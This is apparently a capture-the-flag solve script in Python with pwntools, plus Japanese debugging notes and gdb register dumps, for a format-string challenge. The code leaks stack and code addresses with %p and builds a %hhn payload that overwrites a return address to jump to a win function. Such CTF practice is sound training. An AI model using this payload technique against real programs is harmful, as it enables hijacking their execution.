"""
 checksec chall 
[*] '/workspaces/ctf-problems/ctf4b_2023/Forgot_Some_Exploit/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

from pwn import *
from Crypto.Util.number import *

LOCAL = True
elf = ELF("./chall")

if LOCAL:
    # p = process("./chall")
    p = gdb.debug(
        "./chall",
        """
        b echo
        continue
        """,
    )
else:
    p = remote("forgot-some-exploit.beginners.seccon.games", 9002)


from sys import *
from struct import *

# 0x7ffc914aed30
# スタック先頭 main関数<+14>
p.sendline(b"%p %41$p")
stack_pos_addr, main_func_addr = [int(s, 16) for s in p.recvline().split()]
win_addr = main_func_addr - 290
target = stack_pos_addr + 280

info(f'{hex(target)}: {hex(win_addr)}')

win_addr_hex = hex(win_addr)[2:]
T = []
# for i in range(6):
#     T.append((target + i, int(win_addr_hex[i * 2 : i * 2 + 2], 16)))

for i in range(6):
    T.append((target + 5- i, int(win_addr_hex[i * 2 : i * 2 + 2], 16)))

T = T[::-1]

code = b"".join(p64(t[0]) for t in T)
offset = 6
# 出力した文字数
n = len(T)*8
for i in range(len(T)):
    l = (T[i][1]-n-1)%256+1
    code += "%{0}c%{1}$hhn".format(l, offset+i).encode()
    n += l
print(T)
print(code)
p.sendline(code)
p.interactive()

# 0x7ffc914aed30


# p.sendline(payload)
# p.interactive()


# 0x55ec53ca11ca



# $4 = 0xef7432ec

# スタック位置の特定
"""
aaaaa %6$x
aaaaa 61616161
"""

# 現在のretの位置を知る
# aaaaa %6$x %286$x %118$x %p
# aaaaa %6$x %41$x %p %41$p
# aaaaa %6$x %41$x %p %1$x,%2$x,%3$x,%4$x,%5$x,%6$x,%7$x,%8$x,%9$x,%10$x,%11$x,%12$x,%13$x,%14$x,%15$x,%16$x,%17$x,%18$x,%19$x,%20$x,%21$x,%22$x,%23$x,%24$x,%25$x,%26$x,%27$x,%28$x,%29$x,%30$x,%31$x,%32$x,%33$x,%34$x,%35$x,%36$x,%37$x,%38$x,%39$x
"""
1回目：0x7ffc75a5f5e0
2回目：0x7ffc75a5f5e0
ret：0x7ffc75a5f6f8

280 個下

1回目：0x7ffc63218b50
2回目：0x7ffc63218b50
ret：0x7ffc63218c68

280 個下 → OK
"""
# -290 ずらした位置を計算する

# retの位置を書き換える


# win = 0x56325992d1c9
# ret = 0x56325992d2ec

# 0x0000559266a5f1ca
# 0x000055b56f9161ca

"""
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7f7c185fea37 (<__GI___libc_write+23>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffe71e84dd0 --> 0xa6e ('n\n')
RDI: 0x7ffe71e84cb0 --> 0x7f7c1854c0d0 (<__funlockfile>:        endbr64)
RBP: 0x7ffe71e87000 --> 0x7ffe71e87010 --> 0x1 
RSP: 0x7ffe71e86ef0 --> 0xa6e ('n\n')
RIP: 0x55b56f9162dc (<echo+153>:        leave)
R8 : 0x2 
R9 : 0x7f7c1871e040 (<_dl_fini>:        endbr64)
R10: 0x7ffe71e86ef0 --> 0xa6e ('n\n')
R11: 0x246 
R12: 0x7ffe71e87128 --> 0x7ffe71e893a3 ("/workspaces/ctf-problems/ctf4b_2023/Forgot_Some_Exploit/chall")
R13: 0x55b56f9162de (<main>:    push   rbp)
R14: 0x55b56f918d78 --> 0x55b56f916180 (<__do_global_dtors_aux>:        endbr64)
R15: 0x7f7c18752040 --> 0x7f7c187532e0 --> 0x55b56f915000 --> 0x10102464c457f
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55b56f9162cc <echo+137>:   sub    rax,QWORD PTR fs:0x28
   0x55b56f9162d5 <echo+146>:   je     0x55b56f9162dc <echo+153>
   0x55b56f9162d7 <echo+148>:   call   0x55b56f916050 <__stack_chk_fail@plt>
=> 0x55b56f9162dc <echo+153>:   leave  
   0x55b56f9162dd <echo+154>:   ret    
   0x55b56f9162de <main>:       push   rbp
   0x55b56f9162df <main+1>:     mov    rbp,rsp
   0x55b56f9162e2 <main+4>:     mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7ffe71e86ef0 --> 0xa6e ('n\n')
0008| 0x7ffe71e86ef8 --> 0x0 
0016| 0x7ffe71e86f00 --> 0x0 
0024| 0x7ffe71e86f08 --> 0x0 
0032| 0x7ffe71e86f10 --> 0x0 
0040| 0x7ffe71e86f18 --> 0x0 
0048| 0x7ffe71e86f20 --> 0x0 
0056| 0x7ffe71e86f28 --> 0x7ffe71e80000 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000055b56f9162dc in echo ()
"""

"""
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7f7c185fea37 (<__GI___libc_write+23>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffe71e84dd0 --> 0xa6e ('n\n')
RDI: 0x7ffe71e84cb0 --> 0x7f7c1854c0d0 (<__funlockfile>:        endbr64)
RBP: 0x7ffe71e87010 --> 0x1 
RSP: 0x7ffe71e87008 --> 0x55b56f9162ec (<main+14>:      lea    rax,[rip+0xd34]        # 0x55b56f917027)
RIP: 0x55b56f9162dd (<echo+154>:        ret)
R8 : 0x2 
R9 : 0x7f7c1871e040 (<_dl_fini>:        endbr64)
R10: 0x7ffe71e86ef0 --> 0xa6e ('n\n')
R11: 0x246 
R12: 0x7ffe71e87128 --> 0x7ffe71e893a3 ("/workspaces/ctf-problems/ctf4b_2023/Forgot_Some_Exploit/chall")
R13: 0x55b56f9162de (<main>:    push   rbp)
R14: 0x55b56f918d78 --> 0x55b56f916180 (<__do_global_dtors_aux>:        endbr64)
R15: 0x7f7c18752040 --> 0x7f7c187532e0 --> 0x55b56f915000 --> 0x10102464c457f
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55b56f9162d5 <echo+146>:   je     0x55b56f9162dc <echo+153>
   0x55b56f9162d7 <echo+148>:   call   0x55b56f916050 <__stack_chk_fail@plt>
   0x55b56f9162dc <echo+153>:   leave  
=> 0x55b56f9162dd <echo+154>:   ret    
   0x55b56f9162de <main>:       push   rbp
   0x55b56f9162df <main+1>:     mov    rbp,rsp
   0x55b56f9162e2 <main+4>:     mov    eax,0x0
   0x55b56f9162e7 <main+9>:     call   0x55b56f916243 <echo>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe71e87008 --> 0x55b56f9162ec (<main+14>:     lea    rax,[rip+0xd34]        # 0x55b56f917027)
0008| 0x7ffe71e87010 --> 0x1 
0016| 0x7ffe71e87018 --> 0x7f7c18513d90 (<__libc_start_call_main+128>:  mov    edi,eax)
0024| 0x7ffe71e87020 --> 0x0 
0032| 0x7ffe71e87028 --> 0x55b56f9162de (<main>:        push   rbp)
0040| 0x7ffe71e87030 --> 0x100000000 
0048| 0x7ffe71e87038 --> 0x7ffe71e87128 --> 0x7ffe71e893a3 ("/workspaces/ctf-problems/ctf4b_2023/Forgot_Some_Exploit/chall")
0056| 0x7ffe71e87040 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000055b56f9162dd in echo ()
gdb-peda$ 
"""

# 
# 1つ下に向ける

"""
     0x000055b56f9161c9 <+0>:     push   rbp
->   0x000055b56f9161ca <+1>:     mov    rbp,rsp
"""

"""
元々：0x55b56f9162ec
行きたい：0x000055b56f9161ca
"""


#  0x00005584810a02ec

# aaaaa 61616161 810a02ec 0x5825d160 5825d160,ff,42949992,42a4ff10,42a69040,61616161,25207824,20702520,2432252c,252c7824,78243525,37252c78,2c782438,3031252c,78243131,252c7824,3431252c,78243531,252c7824,3831252c,78243931,252c7824,3232252c,78243332,252c7824,3632252c,78243732,252c7824,3033252c,78243133,252c7824,3433252c,78243533,252c7824,3833252c,78243933,0,0,f7d50400

# aaaaa %6$x %41$hhn